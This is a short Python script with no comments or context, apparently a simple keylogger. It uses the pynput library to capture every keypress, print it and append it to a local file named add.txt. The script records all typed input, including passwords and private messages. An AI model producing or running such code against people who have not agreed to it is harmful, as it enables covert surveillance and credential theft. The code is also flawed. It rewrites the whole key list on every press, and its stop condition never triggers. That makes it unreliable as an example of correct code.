from pynput.keyboard import Key, Listener

list=[]

def press(show):
    list.append(show)
    write(list)
    print(show)
    
def write(var):
    with open("add.txt", "a") as f:
        for i in var:
            new_var = str(i)
            f.write(new_var)
            f.write(",")
                
def release(show):
    if show == Key:
        return False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()